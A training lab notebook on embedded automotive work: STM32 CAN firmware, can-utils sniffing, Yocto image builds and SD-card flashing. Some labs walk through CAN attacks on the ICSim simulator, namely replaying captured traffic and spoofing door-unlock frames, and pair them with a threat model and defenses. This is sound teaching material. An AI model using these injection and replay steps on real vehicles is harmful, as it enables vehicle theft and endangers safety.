# Day 5

## Lab - Connecting BBB Rev D with STM32F446RE Nucleo via SN65HVD230 CAN Module

<img width="835" height="736" alt="image" src="https://github.com/user-attachments/assets/a74dfb0c-d45d-4a1e-8383-fdc449a8e6bd" />

<img width="752" height="780" alt="image" src="https://github.com/user-attachments/assets/93cfd391-99bb-40ad-b769-df9cc1a53c60" />

Nucleo Firmware code is
<pre>
// my-project.c - CAN1 ping-pong on Nucleo-F446RE at 125 kbit/s (libopencm3)
// PB9=CAN1_TX, PB8=CAN1_RX. USART2 debug on /dev/ttyACM0 @115200.
// Phase 1: ping (ID 0x321) once per second until a reply is received.
// Phase 2: respond to each received frame with a pong (ID 0x321).
#include <libopencm3/stm32/rcc.h>
#include <libopencm3/stm32/gpio.h>
#include <libopencm3/stm32/can.h>
#include <libopencm3/stm32/usart.h>
#include <stddef.h>

static void clock_setup(void)
{
    rcc_clock_setup_pll(&rcc_hsi_configs[RCC_CLOCK_3V3_84MHZ]);  // HSI, APB1=42MHz
    rcc_periph_clock_enable(RCC_GPIOA);
    rcc_periph_clock_enable(RCC_GPIOB);
    rcc_periph_clock_enable(RCC_CAN1);
    rcc_periph_clock_enable(RCC_USART2);
}

static void usart_setup(void)
{
    gpio_mode_setup(GPIOA, GPIO_MODE_AF, GPIO_PUPD_NONE, GPIO2 | GPIO3);
    gpio_set_af(GPIOA, GPIO_AF7, GPIO2 | GPIO3);
    usart_set_baudrate(USART2, 115200);
    usart_set_databits(USART2, 8);
    usart_set_stopbits(USART2, USART_STOPBITS_1);
    usart_set_mode(USART2, USART_MODE_TX);
    usart_set_parity(USART2, USART_PARITY_NONE);
    usart_set_flow_control(USART2, USART_FLOWCONTROL_NONE);
    usart_enable(USART2);
}

static void uprint(const char *s)
{
    while (*s) usart_send_blocking(USART2, *s++);
}

static void uprint_hex(uint8_t b)
{
    const char *h = "0123456789ABCDEF";
    usart_send_blocking(USART2, h[(b >> 4) & 0xF]);
    usart_send_blocking(USART2, h[b & 0xF]);
}

static void gpio_setup(void)
{
    gpio_mode_setup(GPIOA, GPIO_MODE_OUTPUT, GPIO_PUPD_NONE, GPIO5);   // LD2
    gpio_mode_setup(GPIOB, GPIO_MODE_AF, GPIO_PUPD_NONE, GPIO8 | GPIO9);
    gpio_set_af(GPIOB, GPIO_AF9, GPIO8 | GPIO9);
}

static void can_setup(void)
{
    can_reset(CAN1);
    int ret = can_init(CAN1,
             false, true, true, false, false, false, /* param 4 is NART: true */
             CAN_BTR_SJW_1TQ, CAN_BTR_TS1_11TQ, CAN_BTR_TS2_2TQ,
             24,           /* prescaler for 125 kbit/s at APB1=42MHz */
             false,        /* loopback off */
             false);       /* silent off */
    
    if (ret) uprint("CAN init FAILED\r\n");
    else     uprint("CAN init OK (125k)\r\n");
    
    can_filter_id_mask_32bit_init(0, 0, 0, 0, true);   /* accept all into FIFO0 */
}

static void delay(volatile uint32_t n) { while (n--) __asm__("nop"); }

/* returns 1 and prints if a frame was received, else 0 */
static int check_rx(void)
{
    if (CAN_RF0R(CAN1) & CAN_RF0R_FMP0_MASK) {
        uint32_t id; bool ext, rtr; uint8_t fmi, len, rx[8];
        can_receive(CAN1, 0, true, &id, &ext, &rtr, &fmi, &len, rx, NULL);
        uprint("RX id=");
        uprint_hex((id >> 8) & 0xFF);
        uprint_hex(id & 0xFF);
        uprint(" data=");
        for (int i = 0; i < len && i < 8; i++) {
            uprint_hex(rx[i]);
            usart_send_blocking(USART2, ' ');
        }
        uprint("\r\n");
        gpio_toggle(GPIOA, GPIO5);
        return 1;
    }
    return 0;
}

int main(void)
{
    clock_setup();
    gpio_setup();
    usart_setup();
    uprint("\r\n=== Nucleo CAN ping-pong node ===\r\n");
    can_setup();

    uint8_t tx[8] = {0x11, 0x22, 0x33, 0x44, 0, 0, 0, 0};

    /* Phase 1: keep pinging until the BBB answers */
    uprint("Phase 1: pinging until BBB answers...\r\n");
    int got_reply = 0;
    while (!got_reply) {
        int mb = can_transmit(CAN1, 0x321, false, false, 8, tx);
        
        if (mb < 0) {
            uprint("PING failed - Transmit mailboxes full\r\n");
        } else {
            uprint("PING sent (0x321)\r\n");
        }
        
        gpio_toggle(GPIOA, GPIO5);

        /* wait ~1s for a reply, checking often */
        for (int w = 0; w < 20 && !got_reply; w++) {
            if (check_rx()) got_reply = 1;
            delay(100000);
        }
    }

    /* Phase 2: ping-pong - respond to each received frame */
    uprint("Phase 2: ping-pong mode\r\n");
    while (1) {
        if (check_rx()) {
            delay(500000);   /* small gap before replying */
            int mb = can_transmit(CAN1, 0x321, false, false, 8, tx);
            if (mb < 0) {
                uprint("PONG failed - Mailboxes full\r\n");
            } else {
                uprint("PONG sent (0x321)\r\n");
            }
        }
    }
    return 0;
}  
</pre>


## Lab - CAN bring-up and sniffing

Install CAN tools
```
sudo apt update
sudo apt install -y can-utils
```

CAN bring-up
```
# 1. load the virtual CAN kernel module
sudo modprobe vcan

# 2. create a virtual CAN interface named vcan0
sudo ip link add dev vcan0 type vcan

# 3. bring the interface up
sudo ip link set vcan0 up

# 4. verify it's up
ip link show vcan0
```

Terminal 1 - Basic sniff
```
candump vcan0
```

Terminal 2 - Send some CAN frames
```
cansend vcan0 123#DEADBEEF
cansend vcan0 456#0011223344556677
cansend vcan0 7DF#020100
```

Watch on Terminal 1
<pre>
- This is basic CAN sniffing
  - capturing and viewing bus traffic
- The format is: 
  - interface
  - CAN ID[data length]
  - data bytes.
</pre>
```
vcan0  123   [4]  DE AD BE EF
vcan0  456   [8]  00 11 22 33 44 55 66 77
vcan0  7DF   [3]  02 01 00
```


Generate continuous traffic (simulate a busy bus)
```
# generate random frames every 100ms
cangen vcan0 -g 100 -I i -L 8 -D r -v
```

Advanced sniffing (analyze changing data)
```
cansniffer vcan0
```

To sniff only specific IDs:
```
cansniffer vcan0            # all IDs
candump vcan0,123:7FF       # filter: only ID 0x123
```

Filtering (focus on specific messages)
```
# only show ID 0x123
candump vcan0,123:7FF

# show a range or multiple filters
candump vcan0,100:700,456:7FF

# show everything EXCEPT a certain ID (inverted filter)
candump vcan0,0:0,~123:7FF
```

Injection ( Send crafated frames )
```
cansend vcan0 123#DEADBEEF          # one specific frame
cansend vcan0 200#1122334455667788  # another
```

Logging and Replay
```
# capture to a log file
candump -l vcan0
# (let some traffic flow, e.g. cangen running, then Ctrl+C)

# see the log
ls -l candump-*.log

# replay the captured traffic
canplayer -I candump-*.log
```

If you prefer a script
<pre>
#!/bin/bash
  
# --- Bring-up ---
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set vcan0 up
ip link show vcan0

# --- Sniff (Terminal 1) ---
candump vcan0

# --- Send/inject (Terminal 2) ---
cansend vcan0 123#DEADBEEF

# --- Generate traffic (Terminal 3) ---
cangen vcan0 -g 100 -I i -L 8 -D r -v

# --- Analytical sniffer ---
cansniffer vcan0

# --- Filter ---
candump vcan0,123:7FF

# --- Log and replay ---
candump -l vcan0          # Ctrl+C to stop
canplayer -I candump-*.log
</pre>

Cleanup
```
sudo ip link set vcan0 down
sudo ip link delete vcan0
```

## Lab - ICSim Replay Attack

Install the tools
```
sudo apt update
sudo apt install -y can-utils libsdl2-dev libsdl2-image-dev git
git clone https://github.com/zombieCraig/ICSim.git
cd ICSim && make          # builds icsim and controls
```

Bring up the virtual CAN bus
```
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan 2>/dev/null
sudo ip link set vcan0 up
ip link show vcan0        # confirm UP
```

Start the simulated vehicle (run on the desktop, not headless SSH)
```
cd ~/ICSim
./icsim vcan0             # the instrument cluster (dashboard) window
./controls vcan0          # the control panel window
```

Sniff/Monitor to see the live traffic
```
candump vcan0
```

CAPTURE legitimate traffic
```
candump -l vcan0
```
<pre>
- While this runs, in the controls window 
  - turn on the LEFT turn signal and accelerate to a noticeable speed. 
  - do it for ~10 seconds, then stop the capture with Ctrl+C.
</pre>

Confirm the log was created
```
ls -l candump-*.log
```


Reset the vehicle to a known state
<pre>
- In the controls window, turn the turn signal OFF and slow to zero
- The dashboard should now show no signal and zero speed
- This makes the attack unmistakable, the cluster is currently idle
</pre>

REPLAY the captured traffic (the attack)
```
canplayer -I candump-*.log
# cansniffer vcan0
```

Points to understand
<pre>
- CAN has no authentication and no built-in freshness/anti-replay
- The cluster cannot distinguish a genuine command from a replayed recording
- So an attacker who can record bus traffic can replay it to control functions
- Defenses to discuss:
  - Message authentication (signed/MAC'd frames).
  - Freshness (rolling counters/timestamps so old frames are rejected)  
</pre>

## Lab - Threat model
<pre>
Objective
- threat-model one ECU function (the door-lock), derive three concrete test cases, 
  then execute each against the simulated CAN bus and observe the result. 
 
- Prerequisites
  - can-utils installed, vcan0 up, ICSim built.
  - Bring up the bus and the simulated car:
</pre>

```
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan 2>/dev/null
sudo ip link set vcan0 up
cd ~/ICSim
./icsim vcan0 &
./controls vcan0 &     # click to focus; used to generate legitimate traffic
```

The threat model
<pre>
- Asset: what are we protecting?
- The lock/unlock state of the doors (physical security of the vehicle)
- Interfaces / attack surface: how can it be reached?
- The CAN bus (no authentication)
- The diagnostic port (OBD-II)
- Any wireless gateway that bridges to CAN
- Threats (use STRIDE as a prompt):
- Spoofing: an attacker forges an "unlock" command frame
- Tampering: an attacker alters a legitimate frame's data
- Replay: an attacker records a real unlock and replays it later
- Denial of service: flooding the bus so real lock commands are lost
- AN assumes any frame on the bus is legitimate (no sender authentication)
- The lock ECU trusts the CAN ID + data, nothing else  
</pre>

<pre>
Find the door-lock CAN ID, in the controls window, operate the door lock/unlock. 
Watch cansniffer, the CAN ID whose bytes change when you lock/unlock is the door-lock message. 
Note that ID and the data values for "lock" vs "unlock."
</pre>
```
cansniffer vcan0  
```

Execute the three test cases

Test case 1: spoofed unlock frame (Spoofing)
Threat: an attacker forges an unlock command without authorization.
Execute: inject the unlock frame you found in recon, without touching the controls:
```
cansend vcan0 <DOOR_ID>#<UNLOCK_DATA>
# example (use YOUR recon values):
cansend vcan0 19B#000000000004
```

Observe: the ICSim dashboard shows the doors unlock, from a forged frame.
Result to record: "Spoofed unlock succeeded, the ECU accepted a forged command."

Test case 2: replayed frame (Replay)
Threat: an attacker records a legitimate unlock and replays it later.
Execute: capture a real unlock (operate the control), then replay it:
```
candump -l vcan0
# in controls: unlock the doors, then Ctrl+C
ls -l candump-*.log
# lock the doors again via controls (reset)
canplayer -I candump-*.log      # replay the recorded unlock
```

Observe: the doors unlock again from the replay, no live command needed.
Result to record: "Replay succeeded, recorded commands work later; no freshness/anti-replay."

Test case 3: out-of-range / malformed value (Tampering / robustness)
<pre>
Threat: an attacker sends invalid data to probe the ECU's handling.
Execute: send the door ID with deliberately invalid/out-of-range data:  
</pre>

```
cansend vcan0 <DOOR_ID>#FFFFFFFFFFFFFFFF   # all-ones, out of spec
cansend vcan0 <DOOR_ID>#00                  # too short / unexpected
```

<pre>
Observe: how does the cluster react? Does it ignore it, glitch, or behave unexpectedly? Record the behavior.
Result to record: "Out-of-range value caused [observed behavior], indicates the ECU does/doesn't validate input."
</pre>


## Lab - First image build

Install these tools on your laptop
```
sudo apt update
sudo apt install -y gawk wget git diffstat unzip texinfo gcc build-essential \
    chrpath socat cpio python3 python3-pip python3-pexpect xz-utils \
    debianutils iputils-ping python3-git python3-jinja2 python3-subunit \
    zstd liblz4-tool file locales libacl1
sudo locale-gen en_US.UTF-8
```

Clone Poky (the Yocto reference distribution- pick stable)
```
cd ~
git clone https://git.yoctoproject.org/poky
cd poky
git branch -a | grep -E "kirkstone|scarthgap|nanbield|styhead"   # see available releases
git checkout scarthgap     # example: a recent LTS; confirm the current LTS name
source oe-init-build-env
# nano conf/local.conf
# Find the MACHINE line (it defaults to qemux86-64) and set it to the BeagleBone
MACHINE = "beaglebone-yocto"

# use more parallelism (set to your CPU core count)
BB_NUMBER_THREADS = "8"
PARALLEL_MAKE = "-j 8"

# share downloads and sstate cache across builds (big time saver)
DL_DIR = "${TOPDIR}/../downloads"
SSTATE_DIR = "${TOPDIR}/../sstate-cache"

bitbake core-image-minimal
ls -lh tmp/deploy/images/beaglebone-yocto/
```

Look for
- core-image-minimal-beaglebone-yocto.wic
- .wic.xz (complete SDCard Image)
- The kernel (zImage or Image), device tree (.dtb), and rootfs tarball


## Lab - Custom Recipe and Layer
<pre>
- Objective: create your own Yocto layer, write a recipe that compiles a simple "hello" C program, 
  add it to your image, and rebuild so the program ends up in the target rootfs
</pre>

```
cd ~/poky
source oe-init-build-env      # puts you in ~/poky/build

# Create your custom layer
bitbake-layers create-layer ../meta-tektutor

# bitbake-layers add-layer ../meta-tektutor
bitbake-layers add-layer ../meta-tektutor
bitbake-layers show-layers

# create the recipe directory structure
cd ~/poky/meta-tektutor
mkdir -p recipes-apps/hello/files


```
#### nano recipes-apps/hello/files/hello.c

<pre>
#include <stdio.h>

int main(void)
{
    printf("Hello from TekTutor, built with Yocto!\n");
    return 0;
}  
</pre>

#### write the recipe
nano recipes-apps/hello/hello_1.0.bb
<pre>
SUMMARY = "A simple hello world application by TekTutor"
DESCRIPTION = "Prints a greeting; demonstrates a custom Yocto recipe"
LICENSE = "MIT"
LIC_FILES_CHKSUM = "file://${COMMON_LICENSE_DIR}/MIT;md5=0835ade698e0bcf8506ecda2f7b4f302"

SRC_URI = "file://hello.c"

S = "${WORKDIR}"

do_compile() {
    ${CC} ${CFLAGS} ${LDFLAGS} hello.c -o hello
}

do_install() {
    install -d ${D}${bindir}
    install -m 0755 hello ${D}${bindir}/hello
}  
</pre>

#### Test build just the recipe
```
cd ~/poky/build
bitbake hello
```

#### Add the recipe to the image
```
nano conf/local.conf
```
<pre>
IMAGE_INSTALL:append = " hello"  
</pre>

rebuild the image
```
bitbake core-image-minimal
```

verify hello is in the image
```
# search the image's manifest/rootfs
oe-pkgdata-util find-path /usr/bin/hello
# or check the rootfs directly
ls -l tmp/work/*/core-image-minimal/*/rootfs/usr/bin/hello 2>/dev/null
```

Or, once you flash and boot the image , run hello on the target
<pre>
# on the BeagleBone after booting the Yocto image
hello
# prints: Hello from TekTutor, built with Yocto!  
</pre>


## Lab - Flash anb boot

Locate the image file
```
cd ~/poky/build/tmp/deploy/images/beaglebone-yocto/
ls -lh core-image-minimal-beaglebone-yocto*.wic*
```

You are supposed to see
<pre>
core-image-minimal-beaglebone-yocto.wic (uncompressed), or
core-image-minimal-beaglebone-yocto.wic.xz (compressed).  
</pre>

identify the SD card device
```
lsblk

# unmount automount 
sudo umount /dev/sdX* 2>/dev/null || true

# flash the image
sudo dd if=core-image-minimal-beaglebone-yocto.wic of=/dev/sdX bs=4M status=progress conv=fsync
sync
```

If the image is compressed (.wic.xz), decompress on the fly while writing
```
xzcat core-image-minimal-beaglebone-yocto.wic.xz | sudo dd of=/dev/sdX bs=4M status=progress conv=fsync
sync
```

